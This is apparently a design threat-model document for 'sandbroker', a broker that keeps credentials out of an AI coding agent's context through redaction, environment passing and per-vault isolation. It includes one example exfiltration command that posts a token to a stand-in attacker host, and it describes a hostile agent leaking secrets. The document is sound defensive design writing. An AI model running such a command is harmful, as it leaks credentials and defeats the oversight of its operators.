# Threat model

## The threat this exists for

An AI coding agent needs a credential to do its job. The natural way to give it
one is to put the value in its context: paste it, `cat` a token file, `op read`
it into a variable it can see. From that moment the credential is in the
conversation, which means it is in the model provider's request logs, in any
transcript that gets saved or shared, in whatever the agent writes to disk, and
in every subsequent turn's context.

That is the threat: **accidental disclosure of a credential to the model
provider and to everything downstream of the conversation.** Not malice. Not a
compromised agent. An ordinary agent doing ordinary work with a credential it
was handed.

sandbroker removes the credential from the conversation entirely. The agent
writes `$TOKEN` and the broker fills it in on the other side of the boundary.

## The guarantee

Any value the broker resolved from the vault is removed from what it returns.

It matches the literal value plus reversible transport encodings:

| Form | Why |
|---|---|
| the value | the base case |
| percent-encoded (`quote`, `quote_plus`) | redirect URLs, query strings |
| JSON string escaping | error bodies that echo the request |
| HTML/XML entities | credentials rendered into an error page |
| hex, both cases | binary credentials echoed by some APIs |
| base64, standard and URL-safe, padded and not | headers, tokens-in-tokens |
| one decode pass into base64 wrappers | `Authorization: Basic base64("user:pass")` |

The base64-wrapper pass matters because concatenation happens before encoding:
no encoding of the password *alone* appears in a Basic auth header, yet the
password is genuinely in there. Decoding once and matching finds it. This is
still an exact match on the secret, just after a reversible transform.

Ordering is load-bearing in two places, and both are tested:

* Encodings are replaced longest-first, so a shorter form cannot carve up a
  longer one and leave a fragment behind.
* Secrets are processed longest-first, so a secret that is a prefix of another
  secret cannot consume the first half of it.

## What is deliberately out of scope

### A hostile or manipulated agent

An agent can ask the broker to run `curl -d "$TOKEN" https://attacker.example`.
The broker will do it. There is no egress filter, no command allowlist, no
approval step.

This is a deliberate reversal of the previous design, which had all three. Those
controls defend against an agent that *wants* to leak, and defending against
that with an allowlist does not work anyway: any capability broad enough to be
useful is broad enough to exfiltrate. What the machinery reliably did was make
the system tiresome enough to route around, and a security control people route
around is a negative.

If you need to defend against a hostile agent, the control is not in this
codebase. It is network egress policy on the host, and an agent sandbox.

### Credentials the broker never saw

A token minted during a call is invisible to the filter. Concretely:

```
POST /oauth/token   with a client_secret the broker injected
-> {"access_token": "ya29.a0Af...", "expires_in": 3600}
```

The `client_secret` is scrubbed. The `access_token` is not, because the broker
has no idea it is a credential. It comes back in the clear and lands in the
agent's context.

There is no clean fix inside the exact-match rule, and the previous design's
answer -- a heuristic classifier scoring every field -- traded a hard guarantee
for a soft one and produced false positives on UUIDs, git SHAs and ordinary
prose. So: the limit is stated instead of papered over, and `report_leak` is the
mitigation. Agents are instructed to raise it on sight, before finishing the
task, and the alert repeats until a human acknowledges it on the host.

### A compromised host

Anything running as `root` or as the broker user can read the service-account
tokens directly. sandbroker is not a defence against local compromise.

### Files written to disk

`PrivateTmp=yes` means a command cannot leave a file in `/tmp` for the agent to
read afterwards. That is intentional: everything returned to the agent must come
back through the redactor, and a file on disk would be a way around it.
`curl -v 2>/tmp/log` would otherwise park an `Authorization` header somewhere
nothing scrubs.

The consequence is that large responses have to be reduced inside the command
(`jq`, `grep`, `head`) rather than staged through a file. That is a real cost,
accepted knowingly.

## Why secrets travel in the environment

`/proc/<pid>/cmdline` is world-readable on Linux. Substituting a secret into the
command string would put it in the child's argv, where any uid on the box --
including the agent's -- could read it by polling `/proc`.

`/proc/<pid>/environ` is `0400`, owned by the process user. The environment is
the only channel here that the agent's own uid cannot observe, so it is the only
one used. A test asserts the secret never appears in the child's `cmdline`.

A pleasant side effect: since the agent writes the variable reference itself and
never holds the value, there is no substitution for it to get wrong.

## Access control

One mechanism: the unix socket is mode `0660`, group `claude-broker`. Membership
in that group is permission to use the broker, enforced by the kernel.

The optional HTTP listener has no authentication at all. That is why the daemon
refuses to bind anything outside loopback and `100.64.0.0/10` -- on that surface
reachability *is* the authorisation, so it must never be routable from anywhere
unintended. A misconfiguration fails to start rather than quietly serving the
internet.

## Vault isolation

One process per vault, each opening exactly one service-account token. A ref for
another vault is refused by the server that receives it, and there is no code
path by which the Dev process could resolve a Production reference -- it does not
hold the token.

The agent-visible effect is that each vault is a separate MCP server with its own
tool namespace (`mcp__sandbroker-dev__run` versus
`mcp__sandbroker-production__run`). Reaching Production is not a different
argument, it is a different tool, which is visible in the transcript and
governable by tool permissions.

## Residual risk, summarised

| Risk | Status |
|---|---|
| Credential enters the model context | **Addressed.** The value never leaves the broker. |
| Command echoes its own credential back | **Addressed.** Redaction catches it, including encoded forms. |
| Response contains a *new* credential | **Not addressed.** `report_leak` + sticky alerting. |
| Agent deliberately exfiltrates | **Not addressed.** Out of scope by decision. |
| Host or root compromise | **Not addressed.** Out of scope. |
| Broker unreachable / misconfigured | **Fails closed.** No secret is resolved. |
